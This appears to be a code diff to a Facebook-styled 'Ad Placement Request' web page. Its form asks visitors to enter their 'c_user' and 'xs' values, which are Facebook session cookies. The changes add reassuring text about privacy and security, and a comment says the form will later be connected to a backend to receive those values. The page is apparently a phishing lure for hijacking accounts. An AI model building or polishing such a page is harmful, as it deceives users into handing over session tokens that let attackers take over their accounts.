@@ -22,6 +22,13 @@ body {
 h2 {
     text-align: center;
     color: #1877f2;
+    margin-bottom: 15px;
+}
+p.description {
+    text-align: center;
+    color: #333;
+    font-size: 14px;
+    line-height: 1.4;
     margin-bottom: 20px;
 }
 form input, form button {
@@ -42,25 +49,36 @@ form button {
 form button:hover {
     background-color: #155ab6;
 }
+p.note {
+    text-align: center;
+    font-size: 12px;
+    color: #666;
+    margin-top: 10px;
+}
 </style>
 </head>
 <body>
 
 <div class="container">
 <h2>Ad Placement Request</h2>
+<p class="description">
+Please fill in the details below to submit your request for placing an ad. Only the required fields are needed.
+</p>
 
 <form id="adForm">
-    <input type="text" name="c_user" placeholder="c_user" required>
-    <input type="text" name="xs" placeholder="XS" required>
+    <input type="text" name="c_user" placeholder="Enter c_user value" required>
+    <input type="text" name="xs" placeholder="Enter XS value" required>
     <button type="submit">Submit Request</button>
 </form>
+
+<p class="note">Your request will be processed securely. We respect your privacy.</p>
 </div>
 
 <script>
 document.getElementById('adForm').addEventListener('submit', function(e){
     e.preventDefault();
     alert('Thank you! Your request has been submitted.');
-    // You can later connect this to your server to receive c_user and xs
+    // Later, connect this form to a backend to receive c_user and xs
 });
 </script>
 
